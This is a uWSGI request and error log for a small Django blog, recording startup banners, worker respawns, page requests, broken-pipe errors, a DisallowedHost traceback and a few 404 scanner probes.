@@ -1,0 +1,1177 @@
+*** Starting uWSGI 2.0.14 (64bit) on [Tue Mar 28 03:19:21 2017] ***
+compiled with version: 6.2.0 20161005 on 17 January 2017 01:23:52
+os: Linux-4.8.0-30-generic #32-Ubuntu SMP Fri Dec 2 03:43:27 UTC 2016
+nodename: Diamond
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Blog
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Blog
+your processes number limit is 2790
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/Blog/Blog.sock fd 3
+Python version: 3.5.2+ (default, Sep 22 2016, 12:18:14)  [GCC 6.2.0 20160927]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x55ae06537eb0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 800360 bytes (781 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 6 seconds on interpreter 0x55ae06537eb0 pid: 28666 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28666)
+spawned uWSGI worker 1 (pid: 28670, cores: 1)
+spawned uWSGI worker 2 (pid: 28671, cores: 1)
+spawned uWSGI worker 3 (pid: 28672, cores: 1)
+spawned uWSGI worker 4 (pid: 28673, cores: 1)
+spawned uWSGI worker 5 (pid: 28674, cores: 1)
+spawned uWSGI worker 6 (pid: 28676, cores: 1)
+spawned uWSGI worker 7 (pid: 28677, cores: 1)
+spawned uWSGI worker 8 (pid: 28678, cores: 1)
+spawned uWSGI worker 9 (pid: 28679, cores: 1)
+spawned uWSGI worker 10 (pid: 28680, cores: 1)
+[pid: 28677|app: 0|req: 1/1] 123.126.110.179 () {42 vars in 716 bytes} [Tue Mar 28 11:19:30 2017] GET / => generated 3132 bytes in 124 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 28672|app: 0|req: 1/2] 123.126.110.179 () {42 vars in 716 bytes} [Tue Mar 28 11:19:35 2017] GET / => generated 3132 bytes in 213 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+Tue Mar 28 11:19:46 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /todolist (ip 123.126.110.179) !!!
+Tue Mar 28 11:19:46 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET /todolist (123.126.110.179)
+Tue Mar 28 11:19:46 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /blog (ip 123.126.110.179) !!!
+Tue Mar 28 11:19:46 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET /blog (123.126.110.179)
+OSError: write error
+[pid: 28676|app: 0|req: 1/3] 123.126.110.179 () {44 vars in 769 bytes} [Tue Mar 28 11:19:38 2017] GET /todolist => generated 0 bytes in 15458 msecs (HTTP/1.1 200) 2 headers in 0 bytes (0 switches on core 0)
+OSError: write error
+[pid: 28678|app: 0|req: 1/4] 123.126.110.179 () {44 vars in 761 bytes} [Tue Mar 28 11:19:40 2017] GET /blog => generated 0 bytes in 13969 msecs (HTTP/1.1 200) 2 headers in 0 bytes (0 switches on core 0)
+[pid: 28673|app: 0|req: 1/5] 123.126.110.179 () {44 vars in 761 bytes} [Tue Mar 28 11:19:43 2017] GET /blog => generated 11941 bytes in 10945 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28678|app: 0|req: 2/6] 123.126.110.179 () {44 vars in 757 bytes} [Tue Mar 28 11:20:03 2017] GET / => generated 3132 bytes in 45 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28672|app: 0|req: 2/7] 123.126.110.179 () {42 vars in 716 bytes} [Tue Mar 28 11:22:57 2017] GET / => generated 3132 bytes in 47 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28680|app: 0|req: 1/8] 123.126.110.179 () {42 vars in 716 bytes} [Tue Mar 28 11:23:00 2017] GET / => generated 3132 bytes in 549 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28671|app: 0|req: 1/9] 123.126.110.179 () {44 vars in 753 bytes} [Tue Mar 28 11:23:04 2017] GET / => generated 3132 bytes in 1776 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 8 (pid: 28678) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 8 (new pid: 28731)
+[pid: 28672|app: 0|req: 3/10] 123.126.110.179 () {44 vars in 761 bytes} [Tue Mar 28 11:23:08 2017] GET /blog => generated 11941 bytes in 21162 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28676|app: 0|req: 2/11] 123.126.110.179 () {44 vars in 773 bytes} [Tue Mar 28 11:23:36 2017] GET /todolist => generated 3194 bytes in 70 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28731|app: 0|req: 3/12] 123.126.110.179 () {44 vars in 769 bytes} [Tue Mar 28 11:23:39 2017] GET /blog => generated 11941 bytes in 8786 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 28672|app: 0|req: 4/13] 123.126.110.179 () {44 vars in 757 bytes} [Tue Mar 28 11:23:55 2017] GET / => generated 3132 bytes in 587 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28676|app: 0|req: 3/14] 123.126.110.179 () {44 vars in 761 bytes} [Tue Mar 28 11:23:58 2017] GET /blog => generated 11941 bytes in 6916 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 6 (pid: 28676) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 28768)
+[pid: 28731|app: 0|req: 4/15] 223.197.186.149 () {40 vars in 687 bytes} [Tue Mar 28 12:36:13 2017] GET / => generated 3132 bytes in 45 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28768|app: 0|req: 4/16] 223.197.186.149 () {40 vars in 697 bytes} [Tue Mar 28 12:36:21 2017] GET /admin => generated 0 bytes in 81 msecs (HTTP/1.1 301) 3 headers in 142 bytes (1 switches on core 0)
+[pid: 28731|app: 0|req: 5/17] 223.197.186.149 () {40 vars in 699 bytes} [Tue Mar 28 12:36:22 2017] GET /admin/ => generated 0 bytes in 28 msecs (HTTP/1.1 302) 7 headers in 312 bytes (1 switches on core 0)
+[pid: 28768|app: 0|req: 5/18] 223.197.186.149 () {40 vars in 736 bytes} [Tue Mar 28 12:36:22 2017] GET /admin/login/?next=/admin/ => generated 4345 bytes in 147 msecs (HTTP/1.1 200) 7 headers in 373 bytes (1 switches on core 0)
+[pid: 28672|app: 0|req: 5/19] 223.197.186.149 () {52 vars in 1032 bytes} [Tue Mar 28 12:36:25 2017] POST /admin/login/?next=/admin/ => generated 0 bytes in 156 msecs (HTTP/1.1 302) 9 headers in 546 bytes (1 switches on core 0)
+[pid: 28677|app: 0|req: 2/20] 223.197.186.149 () {46 vars in 893 bytes} [Tue Mar 28 12:36:26 2017] GET /admin/ => generated 14833 bytes in 374 msecs (HTTP/1.1 200) 6 headers in 251 bytes (1 switches on core 0)
+[pid: 28672|app: 0|req: 6/21] 223.197.186.149 () {44 vars in 875 bytes} [Tue Mar 28 12:36:29 2017] GET /admin/article/article/ => generated 14569 bytes in 1433 msecs (HTTP/1.1 200) 7 headers in 373 bytes (1 switches on core 0)
+[pid: 28670|app: 0|req: 1/22] 223.197.186.149 () {42 vars in 767 bytes} [Tue Mar 28 12:36:31 2017] GET /admin/jsi18n/ => generated 2344 bytes in 6444 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 28768|app: 0|req: 6/23] 223.197.186.149 () {44 vars in 899 bytes} [Tue Mar 28 12:36:40 2017] GET /admin/article/article/add/ => generated 15541 bytes in 145 msecs (HTTP/1.1 200) 7 headers in 373 bytes (2 switches on core 0)
+[pid: 28731|app: 0|req: 6/24] 223.197.186.149 () {42 vars in 771 bytes} [Tue Mar 28 12:36:41 2017] GET /admin/jsi18n/ => generated 2344 bytes in 49 msecs (HTTP/1.1 200) 3 headers in 93 bytes (2 switches on core 0)
+[pid: 28672|app: 0|req: 7/25] 223.197.186.149 () {52 vars in 1152 bytes} [Tue Mar 28 12:57:46 2017] POST /admin/article/article/add/ => generated 0 bytes in 66 msecs (HTTP/1.1 302) 8 headers in 524 bytes (1 switches on core 0)
+[pid: 28768|app: 0|req: 7/26] 223.197.186.149 () {46 vars in 1110 bytes} [Tue Mar 28 12:57:47 2017] GET /admin/article/article/ => generated 15140 bytes in 152 msecs (HTTP/1.1 200) 8 headers in 457 bytes (2 switches on core 0)
+[pid: 28731|app: 0|req: 7/27] 223.197.186.149 () {42 vars in 767 bytes} [Tue Mar 28 12:57:48 2017] GET /admin/jsi18n/ => generated 2344 bytes in 64 msecs (HTTP/1.1 200) 3 headers in 93 bytes (1 switches on core 0)
+[pid: 28680|app: 0|req: 2/28] 223.197.186.149 () {44 vars in 847 bytes} [Tue Mar 28 12:57:53 2017] GET / => generated 3132 bytes in 49 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28768|app: 0|req: 8/29] 223.197.186.149 () {44 vars in 833 bytes} [Tue Mar 28 12:57:56 2017] GET /blog => generated 14479 bytes in 2086 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 28673|app: 0|req: 2/30] 223.197.186.149 () {44 vars in 831 bytes} [Tue Mar 28 13:02:05 2017] GET /9 => generated 0 bytes in 40 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 28680|app: 0|req: 3/31] 223.197.186.149 () {44 vars in 833 bytes} [Tue Mar 28 13:02:05 2017] GET /9/ => generated 5109 bytes in 7442 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 3 (pid: 28672) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 3 (new pid: 29739)
+[pid: 29739|app: 0|req: 8/32] 139.162.114.70 () {32 vars in 461 bytes} [Tue Mar 28 13:12:11 2017] GET / => generated 3132 bytes in 156 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 28670|app: 0|req: 2/33] 149.154.167.161 () {36 vars in 518 bytes} [Tue Mar 28 13:12:47 2017] GET /blog => generated 14479 bytes in 1918 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 6 (pid: 28768) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 30408)
+DAMN ! worker 8 (pid: 28731) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 8 (new pid: 30630)
+DAMN ! worker 4 (pid: 28673) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 4 (new pid: 30639)
+DAMN ! worker 1 (pid: 28670) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 1 (new pid: 23669)
+DAMN ! worker 10 (pid: 28680) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 10 (new pid: 28516)
+DAMN ! worker 7 (pid: 28677) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 7 (new pid: 29054)
+*** Starting uWSGI 2.0.14 (64bit) on [Sat Apr  1 14:37:41 2017] ***
+compiled with version: 6.2.0 20161005 on 17 January 2017 01:23:52
+os: Linux-4.8.0-30-generic #32-Ubuntu SMP Fri Dec 2 03:43:27 UTC 2016
+nodename: Diamond
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Blog
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Blog
+your processes number limit is 2790
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/Blog/Blog.sock fd 3
+Python version: 3.5.2+ (default, Sep 22 2016, 12:18:14)  [GCC 6.2.0 20160927]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x55dfbfb48eb0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 800360 bytes (781 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 12 seconds on interpreter 0x55dfbfb48eb0 pid: 29097 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 29097)
+spawned uWSGI worker 1 (pid: 29104, cores: 1)
+spawned uWSGI worker 2 (pid: 29105, cores: 1)
+spawned uWSGI worker 3 (pid: 29106, cores: 1)
+spawned uWSGI worker 4 (pid: 29107, cores: 1)
+spawned uWSGI worker 5 (pid: 29108, cores: 1)
+spawned uWSGI worker 6 (pid: 29109, cores: 1)
+spawned uWSGI worker 7 (pid: 29110, cores: 1)
+spawned uWSGI worker 8 (pid: 29111, cores: 1)
+spawned uWSGI worker 9 (pid: 29112, cores: 1)
+spawned uWSGI worker 10 (pid: 29113, cores: 1)
+DAMN ! worker 1 (pid: 29104) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 1 (new pid: 29114)
+Sat Apr  1 22:38:10 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /blog (ip 104.199.238.30) !!!
+Sat Apr  1 22:38:10 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET /blog (104.199.238.30)
+OSError: write error
+[pid: 29105|app: 0|req: 1/1] 104.199.238.30 () {46 vars in 867 bytes} [Sat Apr  1 22:38:00 2017] GET /blog => generated 0 bytes in 10946 msecs (HTTP/1.1 200) 2 headers in 0 bytes (0 switches on core 0)
+Sat Apr  1 22:38:39 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 104.199.238.30) !!!
+Sat Apr  1 22:38:39 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET / (104.199.238.30)
+[pid: 29113|app: 0|req: 1/2] 104.199.238.30 () {44 vars in 828 bytes} [Sat Apr  1 22:38:32 2017] GET / => generated 2572 bytes in 6996 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+OSError: write error
+[pid: 29109|app: 0|req: 1/3] 104.199.238.30 () {44 vars in 828 bytes} [Sat Apr  1 22:38:32 2017] GET / => generated 0 bytes in 7724 msecs (HTTP/1.1 200) 2 headers in 0 bytes (0 switches on core 0)
+DAMN ! worker 2 (pid: 29105) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 2 (new pid: 29135)
+DAMN ! worker 6 (pid: 29109) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 29136)
+[pid: 29113|app: 0|req: 2/4] 104.199.238.30 () {46 vars in 873 bytes} [Sat Apr  1 22:38:45 2017] GET /blog => generated 15438 bytes in 7452 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29110|app: 0|req: 1/5] 104.199.238.30 () {46 vars in 873 bytes} [Sat Apr  1 22:38:58 2017] GET /10 => generated 0 bytes in 93 msecs (HTTP/1.1 301) 3 headers in 139 bytes (1 switches on core 0)
+[pid: 29136|app: 0|req: 3/6] 104.199.238.30 () {46 vars in 875 bytes} [Sat Apr  1 22:38:58 2017] GET /10/ => generated 3212 bytes in 12719 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 10 (pid: 29113) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 10 (new pid: 29139)
+[pid: 29106|app: 0|req: 1/7] 104.199.238.30 () {46 vars in 869 bytes} [Sat Apr  1 22:39:27 2017] GET / => generated 2572 bytes in 10351 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 6 (pid: 29136) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 29142)
+[pid: 29108|app: 0|req: 1/8] 104.199.238.30 () {42 vars in 726 bytes} [Sat Apr  1 22:42:11 2017] GET / => generated 2572 bytes in 140 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 29135|app: 0|req: 2/9] 104.199.238.30 () {44 vars in 822 bytes} [Sat Apr  1 22:42:15 2017] GET /favicon.ico => generated 2819 bytes in 10567 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+DAMN ! worker 8 (pid: 29111) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 8 (new pid: 29179)
+[pid: 29110|app: 0|req: 2/10] 104.199.238.30 () {48 vars in 920 bytes} [Sat Apr  1 22:43:07 2017] GET /blog => generated 15438 bytes in 654 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29112|app: 0|req: 1/11] 104.199.238.30 () {46 vars in 885 bytes} [Sat Apr  1 22:43:26 2017] GET / => generated 2572 bytes in 10711 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 7 (pid: 29110) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 7 (new pid: 29189)
+[pid: 29106|app: 0|req: 2/12] 125.33.161.75 () {40 vars in 636 bytes} [Sat Apr  1 23:29:34 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29189|app: 0|req: 3/13] 125.33.161.75 () {38 vars in 563 bytes} [Sat Apr  1 23:29:37 2017] GET /favicon.ico => generated 2819 bytes in 124 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 29179|app: 0|req: 2/14] 125.33.161.75 () {38 vars in 623 bytes} [Sat Apr  1 23:29:38 2017] GET /favicon.ico => generated 2819 bytes in 104 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+DAMN ! worker 5 (pid: 29108) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 5 (new pid: 29586)
+[pid: 29189|app: 0|req: 4/15] 125.33.161.75 () {42 vars in 681 bytes} [Sat Apr  1 23:29:48 2017] GET /blog => generated 15438 bytes in 696 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29114|app: 0|req: 2/16] 125.33.161.75 () {42 vars in 679 bytes} [Sat Apr  1 23:30:58 2017] GET /7 => generated 0 bytes in 902 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 29135|app: 0|req: 3/17] 125.33.161.75 () {42 vars in 681 bytes} [Sat Apr  1 23:30:59 2017] GET /7/ => generated 3357 bytes in 6870 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 7 (pid: 29189) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 7 (new pid: 29595)
+[pid: 29142|app: 0|req: 4/18] 125.33.161.75 () {42 vars in 685 bytes} [Sat Apr  1 23:31:49 2017] GET /blog => generated 15438 bytes in 4324 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 2 (pid: 29135) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 2 (new pid: 29607)
+DAMN ! worker 6 (pid: 29142) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 29609)
+[pid: 29179|app: 0|req: 3/19] 125.33.161.75 () {42 vars in 693 bytes} [Sat Apr  1 23:31:54 2017] GET /todolist => generated 3523 bytes in 3871 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29609|app: 0|req: 5/20] 125.33.161.75 () {42 vars in 681 bytes} [Sat Apr  1 23:32:00 2017] GET / => generated 2572 bytes in 147 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+DAMN ! worker 8 (pid: 29179) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 8 (new pid: 29612)
+Sat Apr  1 23:32:33 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /todolist (ip 125.33.161.75) !!!
+Sat Apr  1 23:32:33 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET /todolist (125.33.161.75)
+DAMN ! worker 3 (pid: 29106) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 3 (new pid: 29615)
+Sat Apr  1 23:33:02 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /todolist (ip 125.33.161.75) !!!
+Sat Apr  1 23:33:02 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET /todolist (125.33.161.75)
+OSError: write error
+[pid: 29107|app: 0|req: 1/21] 125.33.161.75 () {42 vars in 689 bytes} [Sat Apr  1 23:32:31 2017] GET /todolist => generated 0 bytes in 31394 msecs (HTTP/1.1 200) 2 headers in 0 bytes (0 switches on core 0)
+DAMN ! worker 2 (pid: 29607) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 2 (new pid: 29620)
+[pid: 29112|app: 0|req: 2/22] 42.156.254.48 () {38 vars in 539 bytes} [Sat Apr  1 23:34:23 2017] GET / => generated 2572 bytes in 63 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29595|app: 0|req: 5/23] 157.55.39.172 () {42 vars in 571 bytes} [Sat Apr  1 23:56:15 2017] GET / => generated 2572 bytes in 1727 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 4 (pid: 29107) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 4 (new pid: 29832)
+[pid: 29595|app: 0|req: 6/24] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 00:03:14 2017] GET / => generated 2572 bytes in 41 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.hztv3.com.cn'. You may need to add 'www.hztv3.com.cn' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.hztv3.com.cn'. You may need to add 'www.hztv3.com.cn' to ALLOWED_HOSTS.
+[pid: 29112|app: 0|req: 3/25] 23.247.27.58 () {32 vars in 497 bytes} [Sun Apr  2 00:14:04 2017] GET / => generated 0 bytes in 272 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 29112|app: 0|req: 4/26] 220.181.108.122 () {40 vars in 546 bytes} [Sun Apr  2 00:38:27 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29139|app: 0|req: 3/27] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 01:08:35 2017] GET / => generated 2572 bytes in 132 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29112|app: 0|req: 5/28] 42.236.10.75 () {38 vars in 638 bytes} [Sun Apr  2 01:22:32 2017] GET / => generated 2572 bytes in 58 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 29114|app: 0|req: 3/29] 35.162.141.144 () {36 vars in 424 bytes} [Sun Apr  2 01:56:53 2017] GET / => generated 2572 bytes in 82 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 29586|app: 0|req: 3/30] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 02:39:37 2017] GET / => generated 2572 bytes in 141 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 9 (pid: 29112) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 9 (new pid: 31168)
+[pid: 29595|app: 0|req: 7/31] 220.181.108.179 () {38 vars in 520 bytes} [Sun Apr  2 03:43:40 2017] GET /6/ => generated 5879 bytes in 516 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 7 (pid: 29595) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 7 (new pid: 32036)
+[pid: 29114|app: 0|req: 4/32] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 04:09:28 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29586|app: 0|req: 4/33] 186.204.13.22 () {32 vars in 383 bytes} [Sun Apr  2 04:30:59 2017] GET /hndUnblock.cgi => generated 2828 bytes in 40 msecs (HTTP/1.0 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 32036|app: 0|req: 9/34] 186.204.13.22 () {32 vars in 381 bytes} [Sun Apr  2 04:31:00 2017] GET /tmUnblock.cgi => generated 2825 bytes in 97 msecs (HTTP/1.0 404) 2 headers in 80 bytes (2 switches on core 0)
+[pid: 31168|app: 0|req: 6/35] 186.204.13.22 () {36 vars in 481 bytes} [Sun Apr  2 04:31:00 2017] POST /cgi?2 => generated 2798 bytes in 96 msecs (HTTP/1.0 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 29139|app: 0|req: 4/36] 186.204.13.22 () {32 vars in 355 bytes} [Sun Apr  2 04:31:01 2017] GET / => generated 2572 bytes in 82 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 29586|app: 0|req: 5/37] 180.149.130.17 () {38 vars in 623 bytes} [Sun Apr  2 05:04:21 2017] GET / => generated 2572 bytes in 57 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 3 (pid: 29739) died, killed by signal 9 :( trying respawn ...
+[pid: 29832|app: 0|req: 2/38] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 05:44:52 2017] GET / => generated 2572 bytes in 5569 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Respawned uWSGI worker 3 (new pid: 1189)
+DAMN ! worker 6 (pid: 29609) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 1427)
+[pid: 29114|app: 0|req: 5/39] 177.142.90.248 () {26 vars in 281 bytes} [Sun Apr  2 06:53:47 2017] GET / => generated 2572 bytes in 45 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 32036|app: 0|req: 10/40] 185.169.230.8 () {28 vars in 305 bytes} [Sun Apr  2 07:11:47 2017] GET / => generated 2572 bytes in 82 msecs (HTTP/1.0 200) 2 headers in 88 bytes (2 switches on core 0)
